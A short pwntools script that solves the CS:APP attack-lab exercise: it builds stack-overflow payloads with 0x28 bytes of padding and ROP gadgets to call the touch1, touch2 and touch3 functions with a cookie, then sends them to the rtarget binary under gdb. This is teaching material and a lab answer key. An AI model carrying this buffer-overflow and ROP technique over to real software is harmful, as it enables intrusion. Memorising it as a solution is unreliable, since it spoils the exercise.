# -*- coding: UTF-8 -*-
from pwn import*

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./ctarget')

sh = process(argv=['./rtarget','-q'])

Mov2RdiRet = 0x000000000040214d #: mov qword ptr [rdi + 8], rax ; ret
PopRdiRet = 0x000000000040141b
MovEax0Ret = 0x0000000000402dd7 #mov eax, 0 ; ret 

payload1 = 'A'*0x28 + p64(elf.sym['touch1'])
payload2 = 'A'*0x28 + p64(PopRdiRet) + p64(0x59b997fa)+ p64(elf.sym['touch2']) 
PopRaxRet = 0x00000000004019ab 	#0x00000000004019ab : pop rax ; nop ; ret
Cookie_addr = 0x6054e4
payload3 = 'A'*0x28 + p64(PopRdiRet) + p64(Cookie_addr) + p64(PopRaxRet) + p64(0x6166373939623935) + p64(Mov2RdiRet) 
payload3 += p64(PopRdiRet) + p64(Cookie_addr+8) + p64(elf.sym['touch3']) #随机从栈中寻找一个位置放入字符化后的cookie,不能像上一个phase定位，所以进行定点数据填充
gdb.attach(sh,'b getbuf')
sh.sendline(payload3)

sh.interactive()